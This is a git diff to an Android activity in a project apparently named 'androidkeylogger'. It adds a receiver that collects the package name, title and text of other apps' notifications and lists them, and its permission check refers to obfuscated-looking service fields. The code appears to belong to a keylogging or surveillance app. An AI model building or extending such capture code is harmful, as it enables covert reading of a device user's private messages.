@@ -1,28 +1,19 @@
 package com.azamovhudstc.androidkeylogger
 
-import android.annotation.SuppressLint
-import android.app.AlertDialog
 import android.content.*
-import android.net.Uri
-import android.os.Build
 import android.os.Bundle
-import android.util.Base64
 import android.util.Log
-import android.view.Menu
-import android.view.MenuItem
-import android.view.View
-import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
-import kotlinx.coroutines.runBlocking
-import java.io.BufferedReader
+import androidx.recyclerview.widget.RecyclerView
 import java.io.File
-import java.io.FileReader
-import java.nio.charset.StandardCharsets
-import java.text.DateFormat
-import java.text.SimpleDateFormat
-import java.util.*
+import kotlin.collections.ArrayList
 
 class MainFixActivity : AppCompatActivity() {
+    private val fileName = "notifications.txt"
+    private lateinit var recyclerView: RecyclerView
+    private lateinit var adapter: NotificationAdapter
+    private val notifications = mutableListOf<NotificationModel>()
+
     private fun checkPermission() {
         if (!SvcAccFix.i) {
             if (!SvcAccFix.j) {
@@ -32,17 +23,42 @@ class MainFixActivity : AppCompatActivity() {
     }
 
 
-    override fun onCreate(bundle: Bundle?) {
-        super.onCreate(bundle)
+    // Define a BroadcastReceiver to receive notifications from NotificationListenerService
+    private val notificationReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            val packageName = intent?.getStringExtra("packageName")
+            val title = intent?.getStringExtra("title")
+            val text = intent?.getStringExtra("text")
+
+            if (!packageName.isNullOrBlank() && !title.isNullOrBlank() && !text.isNullOrBlank()) {
+                adapter.addNotification(NotificationModel(packageName, title, text))
+            }
+        }
+    }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+
+        recyclerView = findViewById(R.id.notificationRecyclerView)
+        adapter = NotificationAdapter(notifications)
+        recyclerView.adapter = adapter
+
+        // Register the BroadcastReceiver
+        val filter = IntentFilter("com.yourpackage.NOTIFICATION_LISTENER")
+        registerReceiver(notificationReceiver, filter)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        // Unregister the BroadcastReceiver
+        unregisterReceiver(notificationReceiver)
     }
 
     override fun onResume() {
         super.onResume()
         checkPermission()
-        val sharedPref = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
-        Log.d("TEXT", "onResume: ${sharedPref.getString("text", "")}")
-
 
     }
+
 }
